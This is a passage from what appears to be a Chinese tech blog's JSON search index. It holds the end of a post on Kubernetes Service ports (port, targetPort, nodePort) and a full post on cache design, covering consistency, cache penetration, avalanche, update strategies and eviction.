nodePort出现在 Service 描述文件中，Service 为 NodePort 类型时。port 为在k8s集群内服务访问端口；targetPort 为关联 pod 对外开放端口，与上述 containerPort 保持一致；nodePort 为集群外访问端口，端口范围为 30000-32767。例如： 1234567891011121314apiVersion: v1kind: Servicemetadata: name: nginx-pod-service labels: app: nginxspec: type: NodePort ports: - port: 8080 # port是k8s集群内部访问Service的端口 targetPort: 80 # targetPort是pod的端口，从port和nodePort来的流量经过kube-proxy流入到pod的targetPort上 nodePort: 30080 selector: app: nginx 集群外访问方式：节点IP:30080。","link":"/2022/05/20/k8s-%E9%9B%86%E7%BE%A4%E4%B8%AD%E7%9A%84-port/"},{"title":"缓存设计","text":"概述在设计与开发高性能的系统时，基本都离不开缓存的设计。没有缓存对系统的加速和阻挡大量的请求直接落到系统的底层，系统是很难撑住高并发的冲击。无论是在 CPU 的 L1,L2,L3 缓存，数据库的 sql 语句执行缓存，系统应用的本地缓存，缓存总是解决性能的一把利器。本文主要探讨缓存带来的问题以及缓存方案的设计。 缓存带来的问题缓存一致性引入缓存后，主要是解决读的性能问题，但是数据总是要更新的，会存在操作隔离性和更新原子性的问题，是先更新缓存还是先更新数据库呢？ 操作隔离性：一条数据的更新涉及到存储和缓存两套系统，如果多个线程同时操作一条数据，并且没有方案保证多个操作之间的有序执行，就可能会发生更新顺序错乱导致数据不一致的问题 更新原子性：引入缓存后，我们需要保证缓存和存储要么同时更新成功，要么同时更新失败，否则部分更新成功就会导致缓存和存储数据不一致的问题 先更新缓存再更新数据库：更新缓存后，后续的读操作都会先从缓存获取从而获取的是最新的数据，但是如果第二步更新数据库失败，那么数据需要回滚，导致先前获取的数据是脏数据来带不可逆的业务影响 先更新数据库后更新缓存：先更新数据库，但是缓存没有更新，再将数据从数据库同步到缓存这一过程中，所有的读操作读的都是旧数据，会带来一定问题，牺牲小概率的一致性 缓存击穿缓存击穿是指：业务操作访问缓存时，没有访问到数据，又去访问数据库，但是从数据库也没有查询到数据，也不写入缓存，从而导致这些操作每次都需要访问数据库，造成缓存击穿。 解决办法一般有两种： 将每次从数据库获取的数据，即使是空值也先写入缓存，但是过期时间设置得比较短，后续的访问都直接从缓存中获取空值返回即可 通过 Bloom filter 记录 key 是否存在，从而避免无效数据的查询 缓存雪崩缓存雪崩是指：由于大量的热数据设置了相同或接近的过期时间，导致缓存在某一时刻密集失效，大量请求全部转发到数据库，或者是某个冷数据瞬间涌入大量访问数据库。 主要解决方法： 所有数据的过期时间不要设置成一样，防止出现数据批量失效，导致缓存雪崩的情况 采用互斥锁的方式：这里需要使用到分布式锁，在缓存失效后，如果访问同一数据的操作需要访问数据并去更新缓存时，对这些操作都加锁，保证只有一个线程去访问数据并更新缓存，后续所有操作还是从缓存中获取数据，如果一定时间没有获取到就返回默认值或返回空值。这样可以防止数据库压力增大，但是用户体验会降低 后台更新：业务操作需要访问缓存没有获取到数据时，不访问数据库更新缓存，只返回默认值。通过后台线程去更新缓存，这里有两种更新方式： 启动定时任务定时扫描所有缓存，如果不存在就更新，该方法导致扫描 key 间隔时间过长，数据更新不实时，期间业务操作一直会返回默认值，用户体验比较差 业务线程发现缓存失效后通过消息队列去更新缓存，这里因为是分布式的所以可能有很多条消息，需要考虑消息的幂等性。这种方式依赖消息队列，但是缓存更新及时，用户体验比较好，缺点是系统复杂度增高了 缓存方案的设计读取读数据流程很简单，先去缓存读取数据，如果缓存 MISS，则需要从存储中读取数据，并将数据更新到缓存系统中，整个流程如下所示： 更新通常选择以下方案，保障数据可靠性，尽量减少数据不一致的出现，通过 TTL 超时机制在一定时间段后自动解决数据不一致现象： 更新数据库，保证数据可靠性 更新缓存，有以下 2 个策略： 惰性更新：删除缓存中对应的 item，等待下次读 MISS 再缓存（推荐） 积极更新：将最新的数据更新到缓存 淘汰缓存的作用是将热点数据缓存到内存实现加速，内存的成本要远高于磁盘，因此我们通常仅仅缓存热数据在内存，冷数据需要定期的从内存淘汰，数据的淘汰通常有两种方案： 主动淘汰。通过对 Key 设置 TTL 的方式来让 Key 定期淘汰，以保障冷数据不会长久的占有内存（推荐） 被动淘汰。当缓存已用内存超过 Maxmemory 限定时触发淘汰，在 Maxmemory 的场景下缓存的质量是不可控的，因为每次缓存一个 Key 都可能需要去淘汰一个 Key 参考 翻越缓存的三座大山","link":"/2021/02/21/%E7%BC%93%E5%AD%98%E8%AE%BE%E8%AE%A1/"}],"tags":[{"name":"Chinese","slug":"Chinese","link":"/tags/Chinese/"},{"name":"CSAPP","slug":"CSAPP","link":"/tags/CSAPP/"},{"name":"Learned Index","slug":"Learned-Index","link":"/tags/Learned-Index/"},{"name":"English","slug":"English","link":"/tags/English/"},{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"Key-Value Store","slug":"Key-Value-Store","link":"/tags/Key-Value-Store/"},{"name":"k8s","slug":"k8s","link":"/tags/k8s/"},{"name":"File System","slug":"File-System","link":"/tags/File-System/"},{"name":"KubeEdge","slug":"KubeEdge","link":"/tags/KubeEdge/"},{"name":"Database","slug":"Database","link":"/tags/Database/"},{"name":"Edge computing","slug":"Edge-computing","link":"/tags/Edge-computing/"},{"name":"RDMA","slug":"RDMA","link":"/tags/RDMA/"},{"name":"Rocksdb","slug":"Rocksdb","link":"/tags/Rocksdb/"},{"name":"etcd","slug":"etcd","link":"/tags/etcd/"},{"name":"Cache","slug":"Cache","link":"/tags/Cache/"}],"categories":[]}